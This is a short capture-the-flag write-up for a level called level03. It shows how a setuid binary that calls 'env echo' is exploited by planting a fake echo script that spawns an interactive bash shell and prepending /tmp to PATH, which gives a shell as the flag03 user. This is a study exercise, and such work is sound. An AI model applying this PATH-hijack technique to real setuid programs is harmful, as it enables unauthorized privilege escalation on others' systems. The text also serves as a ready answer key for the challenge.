## Solution

* Found executable in user home
```console
~$ ls
level03
```

* Looking at permissions
```console
~$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
level03 is executed as flag03! Lets exploit it

* Deassembly using Ghidra dogbolt

```
iVar1 = system("/usr/bin/env echo Exploit me");
```
Executable is calling echo from env  
Lets modify path to launch a malicious echo

* Malicious echo in /tmp/ (for permissions)

```console
~$ touch echo
...
~$ cat echo
#!/bin/bash
/bin/bash -i
~$ chmod +xwr echo
```

* Lets change path so that our malicious echo is called BEFORE the true echo

```console
~$ export OLD_PATH=$PATH
~$ export PATH=/tmp:$PATH
```

* Launch the executable

```console
~$ whoami
flag03
```
We are flag03 !

* Restore old path
```console
~$ export PATH=$OLD_PATH
```
